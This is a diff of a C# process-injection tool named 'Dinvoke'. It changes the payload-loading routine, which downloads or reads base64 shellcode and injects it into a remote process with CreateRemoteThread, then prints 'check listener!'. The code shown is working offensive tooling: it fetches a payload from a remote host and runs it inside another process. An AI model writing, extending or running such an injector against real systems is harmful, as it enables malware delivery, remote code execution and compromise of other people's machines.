@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.IO;
@@ -153,33 +153,36 @@ namespace Dinvoke
         static byte[] PrepareBytes(string filepath)
         {
             byte[] buf;
-            if (filepath.Substring(0, 7).Equals("http://") || filepath.Substring(0, 8) == "https://")
+            if (filepath.Length > 7)
             {
-                try
+                if (filepath.Substring(0, 7).Equals("http://") || filepath.Substring(0, 8) == "https://")
                 {
-                    WebClient wc = new WebClient();
-                    string base64String = wc.DownloadString(filepath);
                     try
                     {
-                        buf = Convert.FromBase64String(base64String);
-                        Console.WriteLine("[+] " + buf.Length + " bytes downloaded!");
-                        return buf;
+                        WebClient wc = new WebClient();
+                        string base64String = wc.DownloadString(filepath);
+                        try
+                        {
+                            buf = Convert.FromBase64String(base64String);
+                            Console.WriteLine("[+] " + buf.Length + " bytes downloaded!");
+                            return buf;
+                        }
+                        catch
+                        {
+                            Console.WriteLine("[!] URL does not host a base64 encoded payload");
+                            Environment.Exit(1);
+                        }
                     }
                     catch
                     {
-                        Console.WriteLine("[!] URL does not host a base64 encoded payload");
+                        Console.WriteLine("[!] URL not accessible!");
                         Environment.Exit(1);
                     }
                 }
-                catch
-                {
-                    Console.WriteLine("[!] URL not accessible!");
-                    Environment.Exit(1);
-                }
             }
-            else if (File.Exists(filepath))
+            else if (File.Exists(Path.GetFullPath(filepath)))
             {
-                buf = Convert.FromBase64String(File.ReadAllText(filepath));
+                buf = Convert.FromBase64String(File.ReadAllText(Path.GetFullPath(filepath)));
                 return buf;
             }
             throw new Exception("File does not exist");
@@ -305,7 +308,6 @@ namespace Dinvoke
             Console.WriteLine("[+] " + buf.Length + " bytes copied into local map!");
 
             CreateRemoteThread(kernel32Details, pi.hProcess, IntPtr.Zero, 0, hRemoteBaseAddress, IntPtr.Zero, 0, out lpThreadId);
-
             Console.WriteLine("[+] Thread created, check listener!");
         }
     }
